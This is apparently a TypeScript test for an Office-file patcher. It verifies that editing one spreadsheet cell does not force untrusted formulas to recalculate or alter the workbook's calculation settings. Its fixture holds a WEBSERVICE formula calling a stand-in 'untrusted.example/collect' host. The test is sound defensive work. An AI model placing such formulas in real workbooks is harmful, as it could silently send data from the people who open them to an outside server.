import assert from "node:assert/strict"
import { test } from "node:test"
import { buildZip, listZipEntries, readZipTextEntry, utf8Bytes, zipEntryMap } from "@openwork/workbook"
import { patchExcel } from "../src/office"

test("editing an unrelated cell never forces unchecked formulas to recalculate", async () => {
  for (const policy of ["", '<calcPr calcMode="manual" fullCalcOnLoad="0" forceFullCalc="0"/>']) {
    const workbook = `<workbook><sheets><sheet name="Budget" sheetId="1"/></sheets>${policy}</workbook>`
    const formula = 'WEBSERVICE("https://untrusted.example/collect")'
    const sheet = `<worksheet><dimension ref="A1:B1"/><sheetData><row r="1"><c r="A1"><v>1</v></c><c r="B1"><f>${formula}</f><v>0</v></c></row></sheetData></worksheet>`
    const source = await buildZip([{ name: "xl/workbook.xml", data: utf8Bytes(workbook) }, { name: "xl/worksheets/sheet1.xml", data: utf8Bytes(sheet) }])
    const saved = await patchExcel(source, { kind: "spreadsheet", connectionId: "google-workspace", revision: "1", sheetId: "1", changes: [{ row: 1, column: 1, value: "2", formula: false }] })
    const entries = zipEntryMap(listZipEntries(saved))
    assert.equal(await readZipTextEntry(saved, entries, "xl/workbook.xml"), workbook)
    const updated = await readZipTextEntry(saved, entries, "xl/worksheets/sheet1.xml")
    assert.ok(updated?.includes('<c r="A1"><v>2</v></c>'))
    assert.ok(updated?.includes(formula))
  }
})
